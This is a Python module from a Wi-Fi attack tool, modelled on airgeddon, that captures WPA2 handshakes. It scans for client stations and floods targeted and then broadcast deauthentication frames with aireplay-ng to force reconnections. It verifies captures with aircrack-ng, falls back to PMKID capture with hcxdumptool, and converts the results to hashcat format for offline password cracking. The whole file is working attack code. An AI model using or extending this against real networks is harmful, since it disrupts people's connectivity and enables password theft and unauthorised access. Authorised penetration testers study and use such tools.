"""
modules/handshake.py

WPA2 handshake capture engine.
Architecture mirrors airgeddon — the tool proven to work on the same hardware.

Key design decisions (from airgeddon source analysis):
  1. Client scan: no --bssid filter → sees ALL stations on channel → filter in code
  2. Capture: airodump-ng -c CHANNEL -d BSSID (no --write-interval, no --output-format)
  3. Deauth: aireplay-ng --deauth 0 (infinite) running simultaneously with capture
  4. Both processes run until handshake found or total timeout
  5. Verification: aircrack-ng every 5 seconds — simple and definitive
"""
from __future__ import annotations

import csv
import glob
import hashlib
import os
import re
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional, Set


# ─── Data types ──────────────────────────────────────────────────────────────

@dataclass
class WifiClient:
    mac: str
    power: int    # dBm; -100 means unknown
    packets: int

    @property
    def signal_label(self) -> str:
        if self.power == -100:  return "unknown signal"
        if self.power >= -50:   return f"{self.power} dBm  [excellent]"
        if self.power >= -65:   return f"{self.power} dBm  [good]"
        if self.power >= -75:   return f"{self.power} dBm  [fair]"
        return                         f"{self.power} dBm  [weak]"


# ─── Internal helpers ─────────────────────────────────────────────────────────

def _kill(proc: Optional[subprocess.Popen]) -> None:
    """Terminate a process gracefully, then force-kill if needed."""
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.terminate()
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
    except Exception:
        pass


def _find_cap(prefix: str) -> Optional[str]:
    """
    airodump-ng writes PREFIX-01.cap (never PREFIX.cap).
    Returns the most recently modified .cap file for this prefix.
    """
    hits = glob.glob(prefix + '-*.cap')
    return max(hits, key=os.path.getmtime) if hits else None


def _find_csv(prefix: str) -> Optional[str]:
    """Return the airodump-ng CSV file (PREFIX-01.csv)."""
    hits = glob.glob(prefix + '-*.csv')
    return max(hits, key=os.path.getmtime) if hits else None


def _rm(prefix: str) -> None:
    """Remove all airodump-ng output files for a prefix."""
    for pat in (prefix + '-*.cap', prefix + '-*.csv',
                prefix + '-*.kismet.netxml', prefix + '-*.kismet.csv',
                prefix + '-*.log.csv'):
        for f in glob.glob(pat):
            try:
                os.remove(f)
            except OSError:
                pass


def _parse_clients(csv_path: str, target_bssid: str) -> List[WifiClient]:
    """
    Parse airodump-ng CSV Station section for clients of target_bssid.

    Airgeddon difference: scan is run WITHOUT --bssid filter so the CSV
    contains ALL stations on the channel. We filter by BSSID here in code.
    This is why airgeddon sees idle clients that wifi_down misses.

    CSV Station section format (columns, 0-indexed):
      0: Station MAC
      1: First time seen
      2: Last time seen
      3: Power (dBm)
      4: # packets
      5: BSSID (AP this client is associated with)
      6+: Probed ESSIDs
    """
    if not csv_path or not os.path.exists(csv_path):
        return []

    clients: List[WifiClient] = []
    seen: Set[str] = set()
    in_stations = False
    target_up = target_bssid.strip().upper()

    try:
        with open(csv_path, 'r', errors='replace') as fh:
            lines = [ln.replace('\0', '') for ln in fh]

        for row in csv.reader(lines):
            if not row:
                continue

            cell0 = row[0].strip()

            # Section boundary
            if cell0 == 'Station MAC':
                in_stations = True
                continue

            # Skip headers and blanks
            if cell0 in ('BSSID', '') or cell0.startswith('Station MAC'):
                continue

            if not in_stations:
                continue

            if len(row) < 6:
                continue

            mac         = row[0].strip().upper()
            assoc_bssid = row[5].strip().upper()

            # Skip unassociated or wrong AP
            if assoc_bssid in ('(NOT ASSOCIATED)', '', 'BSSID'):
                continue
            if assoc_bssid != target_up:
                continue

            # Basic MAC sanity
            if len(mac) != 17 or mac.count(':') != 5:
                continue

            if mac in seen:
                continue
            seen.add(mac)

            try:
                pwr = int(row[3].strip())
                if pwr in (0, -1):
                    pwr = -100
            except ValueError:
                pwr = -100

            try:
                pkts = int(row[4].strip())
            except ValueError:
                pkts = 0

            clients.append(WifiClient(mac=mac, power=pwr, packets=pkts))

    except Exception:
        pass

    clients.sort(key=lambda c: c.power, reverse=True)
    return clients


def _verify(cap_path: str, bssid: str) -> bool:
    """
    Check cap file for a crackable WPA2 handshake using aircrack-ng.

    Uses a single-word impossible wordlist so aircrack-ng reports the
    handshake count without actually cracking. We look for "WPA (N handshake"
    in stdout where N > 0.

    This is the same verification airgeddon uses (check_bssid_in_captured_file).
    """
    if not cap_path or not os.path.exists(cap_path):
        return False
    try:
        if os.path.getsize(cap_path) < 200:
            return False
    except OSError:
        return False

    wl = '/tmp/_wd_hs_verify.txt'
    try:
        with open(wl, 'w') as f:
            f.write('wifi_down_verify_impossible_xyzzy\n')
    except OSError:
        wl = '/dev/null'

    try:
        r = subprocess.run(
            ['aircrack-ng', '-a', '2', '-b', bssid.upper(), '-w', wl, cap_path],
            capture_output=True, text=True, timeout=20,
        )
        out = r.stdout + r.stderr

        # "WPA (1 handshake)" or "WPA (2 handshake"
        m = re.search(r'WPA\s*\((\d+)\s+handshake', out, re.IGNORECASE)
        if m and int(m.group(1)) > 0:
            return True

        # Older aircrack versions: "1 handshake"
        m2 = re.search(r'(\d+)\s+handshake', out, re.IGNORECASE)
        if m2 and int(m2.group(1)) > 0:
            return True

    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        pass

    return False


def _save(cap_path: str, bssid: str) -> str:
    """Copy cap to captures/, print SHA-256, auto-convert to .hc22000."""
    os.makedirs('captures', exist_ok=True)
    ts     = int(time.time())
    safe   = bssid.replace(':', '')
    ext    = os.path.splitext(cap_path)[1]
    dest   = os.path.join('captures', f'handshake_{safe}_{ts}{ext}')
    shutil.copy2(cap_path, dest)

    sha = hashlib.sha256(Path(dest).read_bytes()).hexdigest()
    print(f'\n  [+] Saved : {dest}')
    print(f'      SHA256: {sha}')

    if ext == '.cap':
        hc = dest.replace('.cap', '.hc22000')
        for tool in ('hcxpcapngtool', 'hcxpcaptool'):
            try:
                subprocess.run(
                    [tool, '-o', hc, dest],
                    capture_output=True, timeout=30,
                )
                if os.path.exists(hc) and os.path.getsize(hc) > 0:
                    print(f'      hashcat: {hc}')
                    break
            except (FileNotFoundError, subprocess.TimeoutExpired):
                continue

    return dest


# ─── Public API ───────────────────────────────────────────────────────────────

def verify_handshake(cap_file: str, bssid: str, ssid: str = '') -> bool:
    """Public wrapper — used by cli.py and tests."""
    return _verify(cap_file, bssid)


def capture_handshake(
    bssid: str,
    ssid: str,
    channel: int,
    monitor_interface: str,
    timeout: int = 180,
) -> Optional[str]:
    """
    Capture a WPA2 handshake. Returns path to saved .cap file or None.

    Exact same flow as airgeddon:

    Phase 1 — Client discovery (15 s)
        airodump-ng without --bssid filter, all stations on channel.
        Parse CSV, filter by our target BSSID.
        Airgeddon difference: no filter = idle clients also visible.

    Phase 2 — Capture + infinite targeted deauth
        airodump-ng -c CHANNEL -d BSSID -w PREFIX IFACE  (capture)
        aireplay-ng --deauth 0 -a BSSID [...]            (infinite deauth)
        Both run simultaneously until handshake found or timeout.
        Airgeddon difference: --deauth 0 = infinite, not burst-then-stop.

    Phase 3 — Fallback broadcast
        If targeted deauth produced nothing: switch to broadcast deauth.
        Keeps running until total timeout.

    Check: aircrack-ng every 5 seconds on the growing cap file.
    """
    iface = monitor_interface
    print(f'\n  [*] Target : {ssid}  ({bssid})')
    print(f'  [*] Channel: {channel}')

    tmpdir = tempfile.mkdtemp(prefix='wd_hs_')
    scan_prefix = os.path.join(tmpdir, 'scan')
    cap_prefix  = os.path.join(tmpdir, 'capture')

    airodump_proc  : Optional[subprocess.Popen] = None
    aireplay_proc  : Optional[subprocess.Popen] = None

    try:
        # ── Phase 1: Client discovery ──────────────────────────────────────
        # Airgeddon scans WITHOUT --bssid so all stations are visible.
        # -c locks to target channel. No --write-interval, no --output-format.
        print(f'  [*] Scanning for clients on channel {channel} (15 s)...')

        scan_proc = subprocess.Popen(
            ['airodump-ng',
             '-c', str(channel),       # lock channel
             '-w', scan_prefix,        # output prefix → scan-01.csv
             '--write-interval', '1',  # flush CSV every second during scan
             iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(15)
        _kill(scan_proc)
        time.sleep(0.5)                # let OS finish writing CSV

        # Parse clients
        csv_path = _find_csv(scan_prefix)
        clients  = _parse_clients(csv_path, bssid) if csv_path else []

        if clients:
            print(f'  [+] {len(clients)} client(s) found:')
            for c in clients:
                print(f'        {c.mac}  {c.signal_label}')
        else:
            print('  [!] No clients found — will use broadcast deauth.')

        top_clients = clients[:3]   # target top-3 by signal strength

        # ── Phase 2: Capture + infinite targeted deauth ────────────────────
        #
        # KEY: airodump and aireplay run SIMULTANEOUSLY and indefinitely.
        # We do not burst-then-check. We check in a background polling loop.
        #
        # airodump flags (mirror airgeddon exactly):
        #   -c CHANNEL          lock to target channel
        #   -d BSSID            filter to target AP   (-d is short for --bssid)
        #   -w PREFIX           output files
        #   NO --output-format  writes all formats (cap + csv + netxml)
        #   NO --write-interval airgeddon doesn't use it; we omit it here too
        #
        print('  [*] Starting capture + deauth...')
        _rm(cap_prefix)             # clean slate

        airodump_proc = subprocess.Popen(
            ['airodump-ng',
             '-c', str(channel),
             '-d', bssid.upper(),   # -d = same as --bssid, works on all versions
             '-w', cap_prefix,
             iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)               # let airodump open interface and create cap file

        # aireplay-ng: --deauth 0 = infinite frames (airgeddon's exact flag)
        # -D disables aireplay's internal channel management (avoids conflict)
        # --ignore-negative-one skips "channel -1" errors
        # Targeted: -c CLIENT for specific client
        if top_clients:
            # Start with the strongest-signal client
            best = top_clients[0]
            print(f'  [*] Deauthing {best.mac} ({best.signal_label}) — infinite frames')
            aireplay_proc = subprocess.Popen(
                ['aireplay-ng',
                 '--deauth', '0',               # INFINITE — airgeddon's approach
                 '-a', bssid.upper(),
                 '-c', best.mac,
                 '-D',                          # disable aireplay channel mgmt
                 '--ignore-negative-one',
                 iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        else:
            print('  [*] Broadcast deauth (no clients) — infinite frames')
            aireplay_proc = subprocess.Popen(
                ['aireplay-ng',
                 '--deauth', '0',
                 '-a', bssid.upper(),
                 '-D',
                 '--ignore-negative-one',
                 iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        # ── Check loop ─────────────────────────────────────────────────────
        # Both airodump and aireplay run in background.
        # We poll the cap file every 5 seconds with aircrack-ng.
        # After SWITCH_TIME seconds, rotate to next client if no handshake.
        SWITCH_TIME   = 30    # seconds before trying next client
        CHECK_EVERY   = 5     # seconds between aircrack-ng checks
        PHASE2_TIME   = int(timeout * 0.65)   # 65% of budget for targeted

        deadline_p2   = time.time() + PHASE2_TIME
        client_idx    = 0
        last_switch   = time.time()
        last_check    = time.time()

        print(f'  [*] Checking every {CHECK_EVERY}s '
              f'for up to {PHASE2_TIME}s...')

        while time.time() < deadline_p2:
            time.sleep(1)

            # Rotate to next client every SWITCH_TIME seconds
            if (top_clients and
                    len(top_clients) > 1 and
                    time.time() - last_switch > SWITCH_TIME):
                client_idx = (client_idx + 1) % len(top_clients)
                next_client = top_clients[client_idx]
                print(f'  [*] Rotating deauth → {next_client.mac}')
                _kill(aireplay_proc)
                time.sleep(0.5)
                aireplay_proc = subprocess.Popen(
                    ['aireplay-ng',
                     '--deauth', '0',
                     '-a', bssid.upper(),
                     '-c', next_client.mac,
                     '-D',
                     '--ignore-negative-one',
                     iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                last_switch = time.time()

            # Check cap file
            if time.time() - last_check >= CHECK_EVERY:
                last_check = time.time()
                cap = _find_cap(cap_prefix)
                if cap:
                    elapsed = int(time.time() - (deadline_p2 - PHASE2_TIME))
                    print(f'  [*] Checking cap [{elapsed}s]...', end=' ', flush=True)
                    if _verify(cap, bssid):
                        print('FOUND!')
                        _kill(aireplay_proc)
                        _kill(airodump_proc)
                        return _save(cap, bssid)
                    print('not yet')

        # ── Phase 3: Broadcast fallback ────────────────────────────────────
        # If targeted deauth on all clients failed, switch to broadcast.
        # Keep airodump running; restart aireplay with broadcast.
        print('  [*] Phase 3: broadcast deauth fallback...')
        _kill(aireplay_proc)
        time.sleep(0.5)

        aireplay_proc = subprocess.Popen(
            ['aireplay-ng',
             '--deauth', '0',
             '-a', bssid.upper(),
             '-D',
             '--ignore-negative-one',
             iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        deadline_p3 = time.time() + (timeout - PHASE2_TIME - 15)
        last_check  = time.time()

        while time.time() < deadline_p3:
            time.sleep(1)
            if time.time() - last_check >= CHECK_EVERY:
                last_check = time.time()
                cap = _find_cap(cap_prefix)
                if cap:
                    elapsed = int(time.time() - (deadline_p3 - (timeout - PHASE2_TIME - 15)))
                    print(f'  [*] Checking cap (broadcast) [{elapsed}s]...', end=' ', flush=True)
                    if _verify(cap, bssid):
                        print('FOUND!')
                        _kill(aireplay_proc)
                        _kill(airodump_proc)
                        return _save(cap, bssid)
                    print('not yet')

        # ── Phase 4: PMKID via hcxdumptool ────────────────────────────────
        # Only attempt if handshake not found in deauth phases.
        # Kill airodump to release the interface exclusively.
        print('  [*] Phase 4: PMKID capture (hcxdumptool, 60 s)...')
        _kill(aireplay_proc)
        _kill(airodump_proc)
        airodump_proc  = None
        aireplay_proc  = None
        time.sleep(1)

        pmkid_result = _pmkid(bssid, iface, tmpdir, duration=60)
        if pmkid_result:
            print(f'  [+] PMKID captured: {pmkid_result}')
            return _save(pmkid_result, bssid)

        print('  [-] No handshake captured.')
        return None

    finally:
        _kill(aireplay_proc)
        _kill(airodump_proc)
        shutil.rmtree(tmpdir, ignore_errors=True)


def _pmkid(bssid: str, iface: str, tmpdir: str, duration: int = 60) -> Optional[str]:
    """
    Passive PMKID capture via hcxdumptool.
    Only called after airodump-ng has been killed (interface released).

    hcxdumptool --filterlist_ap expects BSSID WITHOUT colons:
      correct:   aabbcc112233
      wrong:     aa:bb:cc:11:22:33   (causes filter to be ignored)
    """
    pcapng = os.path.join(tmpdir, 'pmkid.pcapng')
    hc22k  = os.path.join(tmpdir, 'pmkid.hc22000')

    bssid_plain = bssid.lower().replace(':', '')   # remove colons
    filt        = os.path.join(tmpdir, 'bssid.flt')
    with open(filt, 'w') as f:
        f.write(bssid_plain + '\n')

    proc = None
    try:
        proc = subprocess.Popen(
            ['hcxdumptool',
             '-i', iface,
             '-o', pcapng,
             '--enable_status=1',
             f'--filterlist_ap={filt}',
             '--filtermode=2',
             '--disable_deauthentication'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(duration)
    except FileNotFoundError:
        print('  [!] hcxdumptool not installed — PMKID phase skipped')
        return None
    finally:
        _kill(proc)

    if not os.path.exists(pcapng) or os.path.getsize(pcapng) < 100:
        return None

    for tool in ('hcxpcapngtool', 'hcxpcaptool'):
        try:
            subprocess.run(
                [tool, '-o', hc22k, pcapng],
                capture_output=True, timeout=30,
            )
            if os.path.exists(hc22k) and os.path.getsize(hc22k) > 0:
                return hc22k
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    return None


# ─── Backward-compat aliases (used by tests) ─────────────────────────────────

_find_cap_file          = _find_cap
_find_csv_file          = _find_csv
_parse_clients_from_csv = _parse_clients
_parse_airodump_csv     = _parse_clients
